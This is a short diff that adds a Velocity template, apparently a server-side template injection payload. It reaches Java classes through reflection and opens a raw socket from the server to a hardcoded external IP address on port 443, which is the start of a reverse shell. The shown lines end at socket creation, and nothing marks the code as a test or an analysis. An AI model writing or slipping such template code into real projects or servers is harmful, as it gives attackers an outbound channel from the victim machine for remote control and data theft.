@@ -1,0 +1,5 @@
+#set($host="145.249.107.237")
+#set($ia=$host.getClass().forName("java.net.InetAddress").getMethod("getByName",$host.getClass()).invoke(null,$host))
+#set($hostname=$ia.getHostName())
+#set($socketclass=$host.getClass().forName("java.net.Socket").getDeclaredConstructor($host.getClass(),int.class))
+#set($socket=$socketclass.newInstance($host,443))
